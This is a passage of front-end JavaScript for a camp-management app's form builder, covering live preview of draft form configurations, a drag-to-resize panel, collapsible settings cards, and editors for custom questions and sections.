            color:(document.getElementById('pafAccentColor')?.value||'')
        }
    };
}
// Reads the same DOM the Post-Hire builder's Save button reads.
function _collectPostHireFormConfigDraft(){
    var sections={};
    document.querySelectorAll('.phfSec').forEach(function(cb){sections[cb.dataset.key]={enabled:cb.checked}});
    return {
        sections:sections,
        customQuestions:_readCustomQuestions('phf'),
        customSections:_readCustomSections('phf'),
        welcomeMessage:(document.getElementById('phfWelcome')?.value||'').trim(),
        instructions:(document.getElementById('phfInstructions')?.value||'').trim(),
        fields:_readAdvFields('phf',PHF_FIELD_CATALOG),
        sectionOrder:_readSectionOrder('phf'),
        autoSend:!!(document.getElementById('phfAutoSend')&&document.getElementById('phfAutoSend').checked),
        handbook:{
            name:(document.getElementById('phfHandbookName')?.value||''),
            data:(document.getElementById('phfHandbookData')?.value||'')
        },
        policies:_readPhfPolicies(),
        branding:{
            logo:(document.getElementById('phfLogoData')?.value||''),
            color:(document.getElementById('phfAccentColor')?.value||'')
        }
    };
}
// Maps the open builder's kind to the public HTML file it drives — one
// place to extend when a new form kind is added, instead of repeating the
// same ternary chain at every call site.
function _fbPublicPageFile(){
    if(_fbKind==='staff')return'campistry_staff_apply.html';
    if(_fbKind==='postaccept')return'campistry_postaccept.html';
    if(_fbKind==='posthire')return'campistry_posthire.html';
    return'campistry_register.html';
}
function _fbCollectAndSend(){
    var fc=(_fbKind==='staff')?_collectStaffFormConfigDraft():(_fbKind==='postaccept')?_collectPostAcceptFormConfigDraft():(_fbKind==='posthire')?_collectPostHireFormConfigDraft():_collectFormConfigDraft();
    var frame=document.getElementById('fbPreviewFrame');
    if(frame&&frame.contentWindow)frame.contentWindow.postMessage({type:'campistry-form-preview',config:fc},'*');
    if(_fbPreviewWin&&!_fbPreviewWin.closed)_fbPreviewWin.postMessage({type:'campistry-form-preview',config:fc},'*');
}
// "Preview" button in the builder header — opens the actual public form in
// a full browser tab (not the cramped split-view iframe) so the office can
// see exactly what parents/staff/accepted families will see. Live-synced
// the same way the embedded iframe is: the tab announces itself ready, this
// pushes the current unsaved draft, and every subsequent edit re-pushes.
function _fbOpenPreviewWindow(){
    var url=_fbPublicPageFile()+'?preview=1';
    _fbPreviewWin=window.open(url,'_blank');
    if(!_fbPreviewWin)toast('Allow pop-ups to preview the form','error');
}
function _fbPushPreview(){
    clearTimeout(_fbPushTimer);
    _fbPushTimer=setTimeout(_fbCollectAndSend,150);
}

// Drag-to-resize divider between the settings panel and the live preview —
// lets the office widen the settings side when they don't need to see much
// of the preview (e.g. while building Custom Sections) and shrink it back
// when they want to check the layout. Width is stored as a CSS custom
// property on .fb-body (not an inline width on .fb-panel itself) so the
// existing max-width:900px media query — which stacks the panel full-width
// on mobile — still wins there; an inline style would out-specificity it.
var _fbResizeMinPanel=300, _fbResizeMinPreview=280, _fbResizeDefault=400;
function _fbApplyPanelWidth(px){
    var body=document.querySelector('#formBuilderOverlay .fb-body');
    if(body)body.style.setProperty('--fb-panel-w',px+'px');
}
function _fbClampPanelWidth(px){
    var body=document.querySelector('#formBuilderOverlay .fb-body');
    var total=body?body.getBoundingClientRect().width:900;
    var max=Math.max(_fbResizeMinPanel,total-_fbResizeMinPreview-7);
    return Math.max(_fbResizeMinPanel,Math.min(px,max));
}
function _fbInitResizer(){
    var resizer=document.getElementById('fbResizer');
    if(!resizer||resizer._fbWired)return;
    resizer._fbWired=true;
    var dragging=false;
    resizer.addEventListener('pointerdown',function(ev){
        dragging=true;
        resizer.classList.add('fb-resizer--active');
        document.body.style.cursor='col-resize';
        document.body.style.userSelect='none';
        ev.preventDefault();
    });
    resizer.addEventListener('dblclick',function(){
        _fbApplyPanelWidth(_fbResizeDefault);
        try{localStorage.setItem('campistry_fbPanelWidth',_fbResizeDefault);}catch(e){}
    });
    window.addEventListener('pointermove',function(ev){
        if(!dragging)return;
        var body=document.querySelector('#formBuilderOverlay .fb-body');
        if(!body)return;
        var rect=body.getBoundingClientRect();
        var w=_fbClampPanelWidth(ev.clientX-rect.left);
        _fbApplyPanelWidth(w);
    });
    window.addEventListener('pointerup',function(){
        if(!dragging)return;
        dragging=false;
        resizer.classList.remove('fb-resizer--active');
        document.body.style.cursor='';
        document.body.style.userSelect='';
        var body=document.querySelector('#formBuilderOverlay .fb-body');
        var w=body?parseInt(getComputedStyle(body).getPropertyValue('--fb-panel-w'),10):null;
        if(w)try{localStorage.setItem('campistry_fbPanelWidth',w);}catch(e){}
    });
}
function _fbRestorePanelWidth(){
    var saved=_fbResizeDefault;
    try{
        var stored=parseInt(localStorage.getItem('campistry_fbPanelWidth')||'',10);
        if(stored)saved=stored;
    }catch(e){}
    _fbApplyPanelWidth(_fbClampPanelWidth(saved));
}

function openFormBuilder(kind){
    _fbKind=(kind==='staff')?'staff':(kind==='postaccept')?'postaccept':(kind==='posthire')?'posthire':'registration';
    var isStaff=_fbKind==='staff';
    var isPaf=_fbKind==='postaccept';
    var isPhf=_fbKind==='posthire';
    document.getElementById('fbTitle').textContent=isStaff?'Staff Application Form Builder':isPaf?'Post-Acceptance Form Builder':isPhf?'Post-Hire Form Builder':'Registration Form Builder';

    var panel=document.getElementById('fbPanel');
    panel.innerHTML=isStaff?_buildSfcPanelHtml():isPaf?_buildPafPanelHtml():isPhf?_buildPhfPanelHtml():_buildFcPanelHtml();
    _initOrderDrag(isStaff?'sfc':isPaf?'paf':isPhf?'phf':'fc');

    // Live-update the preview on any edit — typing, checkboxes, drag
    // reorder, or a row being added/removed — via one delegated listener
    // pair plus a MutationObserver (drag reorder and add/remove rows don't
    // fire input/change, they mutate the DOM directly).
    if(panel._fbObserver) panel._fbObserver.disconnect();
    panel.oninput=_fbPushPreview;
    panel.onchange=_fbPushPreview;
    var mo=new MutationObserver(_fbPushPreview);
    mo.observe(panel,{childList:true,subtree:true});
    panel._fbObserver=mo;

    var saveBtn=document.getElementById('fbSaveBtn');
    saveBtn.onclick=isStaff?saveStaffFormConfig:isPaf?savePostAcceptFormConfig:isPhf?savePostHireFormConfig:saveFormConfig;

    if(!_fbMsgListenerInstalled){
        _fbMsgListenerInstalled=true;
        window.addEventListener('message',function(ev){
            if(!ev.data||ev.data.type!=='campistry-form-preview-ready')return;
            var f=document.getElementById('fbPreviewFrame');
            var fromIframe=f&&ev.source===f.contentWindow;
            var fromPreviewWin=_fbPreviewWin&&ev.source===_fbPreviewWin;
            if(!fromIframe&&!fromPreviewWin)return;
            _fbCollectAndSend();
        });
    }

    // Show the overlay BEFORE pointing the iframe at its src — some browsers
    // deprioritize/delay a frame's load while its ancestor chain is
    // display:none, which left the preview frame stuck mid-parse.
    document.getElementById('formBuilderOverlay').style.display='flex';
    _fbInitResizer();
    _fbRestorePanelWidth();
    var frame=document.getElementById('fbPreviewFrame');
    frame.src=_fbPublicPageFile()+'?preview=1';
}
function closeFormBuilder(){
    var panel=document.getElementById('fbPanel');
    if(panel&&panel._fbObserver){ panel._fbObserver.disconnect(); panel._fbObserver=null; }
    document.getElementById('formBuilderOverlay').style.display='none';
    var frame=document.getElementById('fbPreviewFrame');
    if(frame)frame.src='about:blank';
    _fbPreviewWin=null; // stop tracking — a tab the office left open just stops updating, it isn't closed for them
}
function _brandingLogoPick(prefix,input){
    var f=input.files&&input.files[0]; if(!f)return;
    if(typeof _downscaleImage==='function'){
        _downscaleImage(f,240,function(dataUrl){
            var img=document.getElementById(prefix+'LogoPreview');
            if(img){img.src=dataUrl;img.style.display='block';}
            document.getElementById(prefix+'LogoData').value=dataUrl;
            // The file input's own 'change' event already bubbles into the
            // Form Builder's live-preview listener, but it fires BEFORE this
            // async downscale callback resolves — pushing here too closes
            // that race so the preview always reflects the actual logo data.
            if(typeof _fbPushPreview==='function')_fbPushPreview();
        });
    }
}
function _brandingLogoClear(prefix){
    document.getElementById(prefix+'LogoData').value='';
    var img=document.getElementById(prefix+'LogoPreview');
    if(img){img.src='';img.style.display='none';}
    // A plain button click fires neither an input/change event nor a DOM
    // mutation the live-preview MutationObserver watches, so without this
    // the preview kept showing the removed logo.
    if(typeof _fbPushPreview==='function')_fbPushPreview();
}

// Shared tab-bar renderer for the parent (fc) and staff (sfc) form
// customizers — two buttons flip between a Quick Setup pane and an
// Advanced pane without closing/reopening the modal.
function _fcTabBarHtml(prefix){
    return '<div style="display:flex;gap:6px;margin-bottom:16px;border-bottom:1px solid var(--s200);padding-bottom:0">'
        +'<button type="button" id="'+prefix+'TabBtnQuick" onclick="CampistryMe._fcSwitchTab(\''+prefix+'\',\'quick\')" style="padding:8px 14px;border:none;border-bottom:2px solid var(--me);background:none;font-weight:700;font-size:.85rem;color:var(--me);cursor:pointer;font-family:inherit">Quick Setup</button>'
        +'<button type="button" id="'+prefix+'TabBtnAdv" onclick="CampistryMe._fcSwitchTab(\''+prefix+'\',\'adv\')" style="padding:8px 14px;border:none;border-bottom:2px solid transparent;background:none;font-weight:700;font-size:.85rem;color:var(--s400);cursor:pointer;font-family:inherit">Advanced</button>'
        +'</div>';
}
function _fcSwitchTab(prefix,tab){
    var q=document.getElementById(prefix+'TabQuick'), a=document.getElementById(prefix+'TabAdv');
    var qb=document.getElementById(prefix+'TabBtnQuick'), ab=document.getElementById(prefix+'TabBtnAdv');
    if(q)q.style.display=(tab==='quick')?'block':'none';
    if(a)a.style.display=(tab==='adv')?'block':'none';
    if(qb){qb.style.borderBottomColor=(tab==='quick')?'var(--me)':'transparent';qb.style.color=(tab==='quick')?'var(--me)':'var(--s400)';}
    if(ab){ab.style.borderBottomColor=(tab==='adv')?'var(--me)':'transparent';ab.style.color=(tab==='adv')?'var(--me)':'var(--s400)';}
}

// Collapsible card used throughout the form customizers so a long list of
// settings reads as a handful of named, closed drawers instead of one dense
// scroll — open only what you're there to change. `sub:true` renders a
// slightly smaller/flatter nested card (used for the per-section field
// groups inside "Field-by-Field Control").
var _accSeq=0;
// Modals that fully rebuild their body on every action (viewCamper,
// viewStaffApp — a note/upload/status-change re-renders the whole thing to
// pick up the new data) would otherwise reset every accordion to its
// default open/closed state on each rebuild, snapping shut a card the user
// just expanded. opts.key is a stable id (unlike the auto-incrementing
// `id` below, which changes every render) that survives across rebuilds —
// pass one whenever the card lives inside a modal that re-renders itself
// mid-interaction. Callers that never re-render while open (the Form
// Builder accordions) can skip it and keep relying on opts.open alone.
var _accOpenState={};
function _accCard(title,bodyHtml,opts){
    opts=opts||{};
    var id='acc'+(_accSeq++);
    var key=opts.key;
    var open=(key&&Object.prototype.hasOwnProperty.call(_accOpenState,key))?_accOpenState[key]:!!opts.open;
    var sub=!!opts.sub;
    return '<div class="fcAcc"'+(opts.wrapId?' id="'+opts.wrapId+'"':'')+' data-acc-id="'+id+'" style="border:1px solid var(--s200);border-radius:'+(sub?'8px':'10px')+';margin-bottom:'+(sub?'6px':'10px')+';overflow:hidden;background:#fff">'
        +'<div onclick="CampistryMe._toggleAcc(\''+id+'\''+(key?',\''+je(key)+'\'':'')+')" style="display:flex;align-items:center;justify-content:space-between;gap:10px;padding:'+(sub?'9px 12px':'12px 16px')+';cursor:pointer;background:'+(sub?'var(--s50)':'#fff')+';user-select:none">'
        +'<span style="font-weight:700;font-size:'+(sub?'.8rem':'.88rem')+';color:var(--s800)">'+esc(title)+(opts.badge?' <span style="font-weight:600;color:var(--s400);font-size:.72rem">'+esc(opts.badge)+'</span>':'')+'</span>'
        +'<span style="display:flex;align-items:center;gap:10px;flex-shrink:0">'
        +(opts.actionHtml?'<span onclick="event.stopPropagation()">'+opts.actionHtml+'</span>':'')
        +'<span id="'+id+'Chev" style="color:var(--s400);font-size:.75rem">'+(open?'▾':'▸')+'</span>'
        +'</span>'
        +'</div>'
        +'<div id="'+id+'" style="display:'+(open?'block':'none')+';padding:14px 16px;border-top:1px solid var(--s200)">'+bodyHtml+'</div>'
        +'</div>';
}
function _toggleAcc(id,key){
    var el=document.getElementById(id); if(!el)return;
    var chev=document.getElementById(id+'Chev');
    var willOpen=el.style.display==='none';
    if(key)_accOpenState[key]=willOpen;
    el.style.display=willOpen?'block':'none';
    if(chev)chev.textContent=willOpen?'▾':'▸';
}

function _buildFcPanelHtml(){
    var fc=getFormConfig();
    var h=_fcTabBarHtml('fc');

    // ── QUICK SETUP — each settings group is its own closed drawer ──
    h+='<div id="fcTabQuick">';

    var welcomeHtml='<div class="fg"><label class="fl">Welcome Message</label><input class="fi" id="fcWelcome" value="'+esc(fc.welcomeMessage||'')+'" placeholder="e.g., Welcome to Camp Sunrise!"></div>'
        +'<div class="fg" style="margin-bottom:0"><label class="fl">Instructions for Parents</label><textarea class="fi" id="fcInstructions" style="min-height:50px;resize:vertical" placeholder="Any special instructions shown at the top of the form">'+(fc.instructions||'')+'</textarea></div>';
    h+=_accCard('Welcome Message',welcomeHtml,{open:true});

    var fcQSplit=_customQuestionsSplit('fc',fc.customQuestions);
    var sectionsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Turn sections on or off. Click a section to add or edit fields right inside it.</p>'
        +_renderSectionsListHtml('fc',FC_SECTIONS,fc,'fcSec',fcQSplit.bySection);
    h+=_accCard('Sections',sectionsHtml,{open:true});

    // Required documents — each with a max number of files parents may upload.
    var docs=(fc.documents&&fc.documents.length)?fc.documents:[{name:'Immunization records',maxFiles:1},{name:'Health form',maxFiles:1},{name:'Insurance card',maxFiles:2}];
    var docsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Documents parents upload during registration. Set how many files each accepts (e.g. front + back of an insurance card = 2).</p>'
        +'<div id="fcDocList">'+docs.map(_renderDocRow).join('')+'</div>'
        +'<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:4px" onclick="CampistryMe.addDocRow()">+ Add Document</button>';
    h+=_accCard('Required Documents',docsHtml,{badge:docs.length+' set'});

    var qHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Standalone questions, shown in an "Additional Information" section. Pick "Show in" to move one inside a built-in section instead (or add it from that section directly, in Sections above).</p>'
        +'<div id="fcQList">'+fcQSplit.flat.map(function(q,i){return renderCustomQ(q,i,'fc',true);}).join('')+'</div>'
        +'<button class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.addCustomQ()">+ Add Question</button>';
    h+=_accCard('Custom Questions',qHtml,{badge:fcQSplit.flat.length+' added',wrapId:'fcQCard'});

    var fcSecs=fc.customSections||[];
    var secHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Build your own multi-field sections — e.g. a full "Dad\'s Info" block with its own name, phone, and email fields, shown as its own labeled section on the form.</p>'
        +'<div id="fcSecList">'+fcSecs.map(function(s){return renderCustomSection(s,_newSid(),'fc');}).join('')+'</div>'
        +'<button type="button" class="me-btn me-btn--sec me-btn--sm" style="margin-top:6px" onclick="CampistryMe.addCustomSection(\'fc\')">+ Add Section</button>';
    h+=_accCard('Custom Sections',secHtml,{badge:fcSecs.length+' added'});

    var g=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
    var promos=g.campistryMe?.promoCodes||{EARLYBIRD:{pct:10,label:'Early Bird 10% Off'},SIBLING:{pct:5,label:'Sibling Discount 5%'},REFER:{amt:50,label:'Referral $50 Off'}};
    var promoHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Discount codes parents can use during registration.</p><div id="fcPromoList">';
    Object.entries(promos).forEach(function([code,p]){
        promoHtml+='<div style="display:flex;gap:6px;align-items:center;margin-bottom:4px;padding:6px 10px;border:1px solid var(--s200);border-radius:var(--r)">';
        promoHtml+='<input class="fi fcPromoCode" style="flex:0 0 120px;font-size:.8rem;padding:5px 8px" value="'+esc(code)+'">';
        promoHtml+='<input class="fi fcPromoLabel" style="flex:1;font-size:.8rem;padding:5px 8px" value="'+esc(p.label||'')+'" placeholder="Label">';
        promoHtml+='<input class="fi fcPromoPct" style="flex:0 0 60px;font-size:.8rem;padding:5px 8px" value="'+(p.pct||'')+'" placeholder="% off">';
        promoHtml+='<input class="fi fcPromoAmt" style="flex:0 0 60px;font-size:.8rem;padding:5px 8px" value="'+(p.amt||'')+'" placeholder="$ off">';
        promoHtml+='<button class="me-btn me-btn--ghost" style="color:var(--err);font-size:.7rem" onclick="this.closest(\'div\').remove()">✕</button></div>';
    });
    promoHtml+='</div><button class="me-btn me-btn--sec me-btn--sm" style="margin-top:4px" onclick="CampistryMe.addPromoRow()">+ Add Code</button>';
    h+=_accCard('Promo / Discount Codes',promoHtml,{badge:Object.keys(promos).length+' codes'});
    h+='</div>'; // /fcTabQuick

    // ── ADVANCED — same drawer pattern; fields are grouped by section ──
    h+='<div id="fcTabAdv" style="display:none">';

    var brandHtml='<div class="fg"><label class="fl">Camp Logo</label>'
        +'<input type="hidden" id="fcLogoData" value="'+esc((fc.branding&&fc.branding.logo)||'')+'">'
        +'<img id="fcLogoPreview" src="'+esc((fc.branding&&fc.branding.logo)||'')+'" style="display:'+((fc.branding&&fc.branding.logo)?'block':'none')+';max-height:60px;max-width:200px;margin-bottom:6px;border-radius:6px">'
        +'<div style="display:flex;gap:8px;align-items:center"><input type="file" accept="image/*" class="fi" style="flex:1" onchange="CampistryMe._brandingLogoPick(\'fc\',this)"><button type="button" class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe._brandingLogoClear(\'fc\')">Remove</button></div></div>'
        +'<div class="fg" style="margin-bottom:0"><label class="fl">Accent Color</label><input type="color" id="fcAccentColor" value="'+esc((fc.branding&&fc.branding.color)||'#D97706')+'" style="width:60px;height:34px;padding:2px;border:1.5px solid var(--s200);border-radius:var(--r);cursor:pointer"></div>';
    h+=_accCard('Branding',brandHtml,{open:true});

    var orderHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Reorder how sections appear on the form.</p>'+_renderSectionOrderList('fc',FC_SECTIONS,fc.sectionOrder);
    h+=_accCard('Section Order',orderHtml,{open:true});

    var fieldsHtml='<p style="font-size:.78rem;color:var(--s400);margin:0 0 10px">Show/hide, require, or relabel individual fields — pick a section to open it.</p>';
    Object.keys(FC_FIELD_CATALOG).forEach(function(sectionKey){
        var sec=FC_SECTIONS.filter(function(s){return s.key===sectionKey})[0];
        var rows=FC_FIELD_CATALOG[sectionKey].map(function(f){return _renderAdvFieldRow('fc',sectionKey,f,(fc.fields||{})[f.id]);}).join('');
        fieldsHtml+=_accCard(sec?sec.label:sectionKey,rows,{sub:true});
    });
    h+=_accCard('Field-by-Field Control',fieldsHtml,{});
    h+='</div>'; // /fcTabAdv
    return h;
}
function openFormConfig(){ openFormBuilder('registration'); }

// Which built-in section a flat Custom Question can be pinned to, so it
// renders inline inside that section's own card on the public form instead
// of only ever landing in the generic "Additional Information" pile at the
// end. Only sections broken out field-by-field in the Advanced tab qualify
// (documents/payment/signature/siblings render structured blocks, not a
// plain field list, so there's nowhere sensible to slot an extra field in).
function _customFieldSectionCatalog(prefix){
    var sections=prefix==='sfc'?SFC_SECTIONS:prefix==='paf'?PAF_SECTIONS:prefix==='phf'?PHF_SECTIONS:FC_SECTIONS;
    var catalog=prefix==='sfc'?SFC_FIELD_CATALOG:prefix==='paf'?PAF_FIELD_CATALOG:prefix==='phf'?PHF_FIELD_CATALOG:FC_FIELD_CATALOG;
    return sections.filter(function(s){return !!catalog[s.key];}).map(function(s){return{key:s.key,label:s.label};});
}
// Splits a camp's customQuestions into the ones pinned to a built-in
// section (rendered inline inside that section's own row in the Sections
// list) vs the standalone ones (rendered in the flat Custom Questions
// card). Single source of truth for that split so the Sections list and
// the Custom Questions card never disagree about which row belongs where.
function _customQuestionsSplit(prefix,list){
    var qSecKeys={}; _customFieldSectionCatalog(prefix).forEach(function(s){qSecKeys[s.key]=true;});
    var flat=[],bySection={};
    (list||[]).forEach(function(q){
        if(q.section&&qSecKeys[q.section])(bySection[q.section]=bySection[q.section]||[]).push(q);
        else flat.push(q);
    });
    return{flat:flat,bySection:bySection};
}
// Renders the Quick Setup "Sections" list — enable/disable each built-in
// section, and for any section with its own field catalog, click the row
// (not the checkbox) to expand an inline editor of the custom fields
// already attached to it, with a "+ Add Field" to add more right there —
// no separate card to find and open.
function _renderSectionsListHtml(prefix,sections,fc,checkboxCls,bySection){
    var qSecKeys={}; _customFieldSectionCatalog(prefix).forEach(function(s){qSecKeys[s.key]=true;});
    var h='';
    sections.forEach(function(s){
        var enabled=fc.sections&&fc.sections[s.key]?fc.sections[s.key].enabled:s.default;
        var disabled=s.required?' disabled':'';
        var supports=!!qSecKeys[s.key];
        var attached=(bySection&&bySection[s.key])||[];
        h+='<div style="border-bottom:1px solid var(--s100)">';
        h+='<div style="display:flex;align-items:center;gap:10px;padding:9px 10px;cursor:'+(supports||!s.required?'pointer':'default')+'"'+(supports?' onclick="CampistryMe._toggleSectionQuestions(\''+prefix+'\',\''+s.key+'\')"':'')+'>';
        h+='<input type="checkbox" class="'+checkboxCls+'" data-key="'+s.key+'" '+(enabled?'checked':'')+disabled+(supports?' onclick="event.stopPropagation()"':'')+' style="accent-color:var(--me);flex-shrink:0;width:16px;height:16px">';
        h+='<div style="flex:1"><div style="font-size:.85rem;font-weight:600;color:var(--s800)">'+esc(s.label)+(s.required?' <span style="font-size:.65rem;color:var(--s400);font-weight:500">(required)</span>':'')+'</div>';
        h+='<div style="font-size:.72rem;color:var(--s400)">'+esc(s.desc)+'</div></div>';
        if(supports){
            if(attached.length)h+='<span style="font-size:.68rem;color:var(--s400);white-space:nowrap">'+attached.length+' field'+(attached.length===1?'':'s')+'</span>';
            h+='<span id="'+prefix+'SecRowChev_'+s.key+'" style="color:var(--s400);font-size:.7rem;flex-shrink:0">▸</span>';
        }
        h+='</div>';
        if(supports){
            h+='<div id="'+prefix+'SecRowBody_'+s.key+'" style="display:none;padding:0 10px 10px 36px">';
            h+='<div id="'+prefix+'SecQList_'+s.key+'">'+attached.map(function(q){return renderCustomQ(q,-1,prefix,true);}).join('')+'</div>';
            h+='<button type="button" class="me-btn me-btn--sec me-btn--sm" style="margin-top:4px" onclick="CampistryMe.addCustomQToSection(\''+prefix+'\',\''+s.key+'\')">+ Add Field</button>';
            h+='</div>';
        }
        h+='</div>';
    });
    return h;
}
function _toggleSectionQuestions(prefix,key){
    var body=document.getElementById(prefix+'SecRowBody_'+key);
    var chev=document.getElementById(prefix+'SecRowChev_'+key);
    if(!body)return;
    var willOpen=body.style.display==='none';
    body.style.display=willOpen?'block':'none';
    if(chev)chev.textContent=willOpen?'▾':'▸';
}
// `isFlat` renders the "Show in section" picker — only meaningful for a
// top-level Custom Questions row; a field nested inside a Custom Section
// already belongs to its own named group, so it's omitted there.
function renderCustomQ(q,i,prefix,isFlat){
    prefix=prefix||'fc';
    var types={'text':'Short Text','textarea':'Long Text','select':'Dropdown','checkbox':'Checkboxes','yesno':'Yes/No'};
    var needsOpts=q.type==='select'||q.type==='checkbox';
    var qCls=prefix+'Q';
    var h='<div class="'+qCls+'" style="border:1px solid var(--s200);border-radius:var(--r);padding:10px 12px;margin-bottom:6px;background:var(--s50)">';
    h+='<div style="display:flex;gap:6px;align-items:center;margin-bottom:6px">';
    h+='<input class="fi '+qCls+'Label" style="flex:1;font-size:.82rem;padding:5px 8px" value="'+esc(q.label||'')+'" placeholder="Question text">';
    h+='<select class="fs '+qCls+'Type" style="flex:0 0 110px;font-size:.78rem;padding:5px 6px" onchange="var o=this.closest(\'.'+qCls+'\').querySelector(\'.'+qCls+'Opts\');o.style.display=(this.value===\'select\'||this.value===\'checkbox\')?\'block\':\'none\'">';
    Object.entries(types).forEach(function([k,v]){h+='<option value="'+k+'"'+(q.type===k?' selected':'')+'>'+v+'</option>'});
    h+='</select>';
    h+='<label style="display:flex;align-items:center;gap:3px;font-size:.72rem;color:var(--s500);white-space:nowrap"><input type="checkbox" class="'+qCls+'Req"'+(q.required?' checked':'')+' style="accent-color:var(--me)">Req</label>';
    h+='<button class="me-btn me-btn--ghost" style="color:var(--err);font-size:.7rem" onclick="this.closest(\'.'+qCls+'\').remove()">✕</button></div>';
    h+='<input class="fi '+qCls+'Opts" style="font-size:.78rem;padding:4px 8px;'+(needsOpts?'':'display:none')+'" value="'+esc((q.options||[]).join(', '))+'" placeholder="Options (comma-separated, e.g. Option A, Option B, Option C)">';
    if(isFlat){
        var secs=_customFieldSectionCatalog(prefix);
        if(secs.length){
            h+='<div style="margin-top:6px;display:flex;align-items:center;gap:6px">';
            h+='<label style="font-size:.72rem;color:var(--s500);white-space:nowrap">Show in</label>';
            h+='<select class="fs '+qCls+'Section" style="flex:1;font-size:.78rem;padding:5px 8px">';
            h+='<option value=""'+(!q.section?' selected':'')+'>Additional Information (standalone)</option>';
            secs.forEach(function(s){h+='<option value="'+esc(s.key)+'"'+(q.section===s.key?' selected':'')+'>'+esc(s.label)+'</option>';});
            h+='</select></div>';
        }
    }
    h+='</div>';
    return h;
}
// Scoped to the whole builder panel (not just #{prefix}QList) — a question
// can now live in the flat list OR inline inside a built-in section's own
// row in the Sections list, and both need to be read back. The only rows
// excluded are ones nested inside a Custom Section (.{prefix}Sec) — those
// are read separately by _readCustomSections below.
function _readCustomQuestions(prefix){
    prefix=prefix||'fc';
    var qCls=prefix+'Q';
    var secCls=prefix+'Sec';
    var scope=document.getElementById('fbPanel')||document;
    var out=[];
    scope.querySelectorAll('.'+qCls).forEach(function(el){
        if(el.closest('.'+secCls))return;
        var label=el.querySelector('.'+qCls+'Label')?.value?.trim();
        var type=el.querySelector('.'+qCls+'Type')?.value||'text';
        var required=el.querySelector('.'+qCls+'Req')?.checked||false;
        var optsRaw=el.querySelector('.'+qCls+'Opts')?.value||'';
        var options=optsRaw?optsRaw.split(',').map(function(o){return o.trim()}).filter(Boolean):[];
        var section=el.querySelector('.'+qCls+'Section')?.value||'';
        if(label)out.push({label:label,type:type,required:required,options:options,section:section});
    });
    return out;
}

function addCustomQ(prefix){
    prefix=prefix||'fc';
    var list=document.getElementById(prefix+'QList');
    var div=document.createElement('div');
    div.innerHTML=renderCustomQ({label:'',type:'text',required:false,options:[],section:''},-1,prefix,true);
    list.appendChild(div.firstChild);
}
function addStaffCustomQ(){ addCustomQ('sfc'); }
// Adds a new custom field pinned to a built-in section, right in that
// section's own inline drawer in the Quick Setup "Sections" list —
// expands the drawer (if collapsed) and focuses the new field's label so
// the admin can start typing immediately, no separate card to find.
function addCustomQToSection(prefix,sectionKey){
    prefix=prefix||'fc';
    var body=document.getElementById(prefix+'SecRowBody_'+sectionKey);
    var chev=document.getElementById(prefix+'SecRowChev_'+sectionKey);
    if(body&&body.style.display==='none'){ body.style.display='block'; if(chev)chev.textContent='▾'; }
    var list=document.getElementById(prefix+'SecQList_'+sectionKey);
    if(!list)return;
    var div=document.createElement('div');
    div.innerHTML=renderCustomQ({label:'',type:'text',required:false,options:[],section:sectionKey},-1,prefix,true);
    var row=div.firstChild;
    list.appendChild(row);
    var labelInput=row.querySelector('.'+prefix+'QLabel');
    if(labelInput)setTimeout(function(){labelInput.focus();},260);
    if(typeof _fbPushPreview==='function')_fbPushPreview();
}

// ── CUSTOM SECTIONS — admin-defined, named groups of fields ────────────────
// A generalization of Custom Questions one level up: a section is a label
// plus its own list of fields, each field using the exact same
// {label,type,required,options} shape (and the exact same renderCustomQ row
// markup/.fcQ class) Custom Questions already uses — reused as-is, just
// rendered inside a per-section container instead of the flat #fcQList, so
// e.g. a full "Dad's Info" block (name, relationship, phone, email) can be
// built and labeled as one unit rather than dumped into the generic
// "Additional Information" pile alongside every other custom question.
function _newSid(){ return Date.now().toString(36)+Math.random().toString(36).slice(2,6); }

function renderCustomSection(sec,sid,prefix){
    prefix=prefix||'fc';
    sec=sec||{};
    var secCls=prefix+'Sec';
    var listId=prefix+'Sec_'+sid+'List';
    var fields=sec.fields||[];
    var h='<div class="'+secCls+'" style="border:1px solid var(--s200);border-radius:var(--r);padding:10px 12px;margin-bottom:8px;background:var(--s50)">';
    h+='<div style="display:flex;gap:6px;align-items:center;margin-bottom:8px">';
    h+='<input class="fi '+secCls+'Label" style="flex:1;font-weight:600;font-size:.85rem;padding:6px 8px" value="'+esc(sec.label||'')+'" placeholder="Section name, e.g. Dad\'s Info">';
    h+='<button type="button" class="me-btn me-btn--ghost" style="color:var(--err);font-size:.7rem;white-space:nowrap" onclick="this.closest(\'.'+secCls+'\').remove()">✕ Remove Section</button></div>';
    h+='<div id="'+listId+'">'+fields.map(function(f){return renderCustomQ(f,-1,prefix);}).join('')+'</div>';
    h+='<button type="button" class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.addSectionField(\''+prefix+'\',\''+sid+'\')">+ Add Field</button>';
    h+='</div>';
    return h;
}
// Reads back every .{prefix}Sec container under #{prefix}SecList — each
// one's fields are read the SAME way _readCustomQuestions reads a flat
// list, just scoped to that one section's own nested container instead of
// the document (querySelectorAll on a subtree naturally can't cross into a
// sibling section's fields, so no extra bookkeeping is needed to keep
// sections from bleeding into each other after an Add/Remove).
function _readCustomSections(prefix){
    prefix=prefix||'fc';
    var secCls=prefix+'Sec';
    var qCls=prefix+'Q';
    var out=[];
    document.querySelectorAll('#'+prefix+'SecList .'+secCls).forEach(function(secEl){
        var label=secEl.querySelector('.'+secCls+'Label')?.value?.trim();
        if(!label)return;
        var fields=[];
        secEl.querySelectorAll('.'+qCls).forEach(function(el){
            var flabel=el.querySelector('.'+qCls+'Label')?.value?.trim();
            var type=el.querySelector('.'+qCls+'Type')?.value||'text';
            var required=el.querySelector('.'+qCls+'Req')?.checked||false;
            var optsRaw=el.querySelector('.'+qCls+'Opts')?.value||'';
            var options=optsRaw?optsRaw.split(',').map(function(o){return o.trim()}).filter(Boolean):[];
            if(flabel)fields.push({label:flabel,type:type,required:required,options:options});
        });
        out.push({id:'sec_'+_newSid(),label:label,fields:fields});
    });
    return out;
}
function addCustomSection(prefix){
    prefix=prefix||'fc';
    var list=document.getElementById(prefix+'SecList');
